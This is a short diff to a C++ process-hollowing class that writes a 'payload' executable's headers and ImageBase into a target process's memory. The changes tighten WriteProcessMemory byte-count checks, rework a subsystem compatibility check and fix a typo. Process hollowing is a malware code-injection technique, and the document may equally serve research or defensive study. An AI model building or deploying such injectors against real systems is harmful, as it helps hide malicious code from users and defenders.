@@ -75,14 +75,14 @@ void Hollowing64Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
     DWORD oldProtection = 0;
     SIZE_T writtenBytes = 0;
     if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
-        sourceNTHeaders->OptionalHeader.SizeOfHeaders, &writtenBytes) || 0 == writtenBytes)
+        sourceNTHeaders->OptionalHeader.SizeOfHeaders, &writtenBytes) || sourceNTHeaders->OptionalHeader.SizeOfHeaders != writtenBytes)
     {
         throw HollowingException("An error occured while writing the payload's headers to the target!");
     }
     // Updating the ImageBase field
     if(0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<LPBYTE>(targetBaseAddress) + sourceDOSHeader->e_lfanew +
         offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + offsetof(IMAGE_OPTIONAL_HEADER64, ImageBase), &targetBaseAddress,
-        sizeof(ULONGLONG), &writtenBytes) || 0 == writtenBytes)
+        sizeof(ULONGLONG), &writtenBytes) || sizeof(ULONGLONG) != writtenBytes)
     {
         throw HollowingException("An error occured while updating the ImageBase field!");
     }
@@ -265,7 +265,7 @@ WORD Hollowing64Bit::GetPEFileSubsystem(const PBYTE fileBuffer)
     return ntHeaders->OptionalHeader.Subsystem;
 }
 
-bool Hollowing64Bit::ValidateCompatibility()
+void Hollowing64Bit::ValidateCompatibility()
 {
     WORD payloadSubsystem = GetPEFileSubsystem(_payloadBuffer);
 
@@ -274,11 +274,9 @@ bool Hollowing64Bit::ValidateCompatibility()
         throw IncompatibleImagesException(!_isTarget64Bit ? "The target is not 64-bit!" : "The payload is not 64-bit!");
     }
 
-    if (IMAGE_SUBSYSTEM_WINDOWS_GUI != payloadSubsystem ||
-        payloadSubsystem != GetProcessSubsystem(_targetProcessInformation.hProcess))
+    if (!(IMAGE_SUBSYSTEM_WINDOWS_GUI == payloadSubsystem ||
+        payloadSubsystem == GetProcessSubsystem(_targetProcessInformation.hProcess)))
     {
-        throw IncompatibleImagesException("The processes' subsystem are'nt the same, or the payload's subsystem is not GUI!");
+        throw IncompatibleImagesException("The processes' subsystem aren't the same, or the payload's subsystem is not GUI!");
     }
-
-    return true;
 }
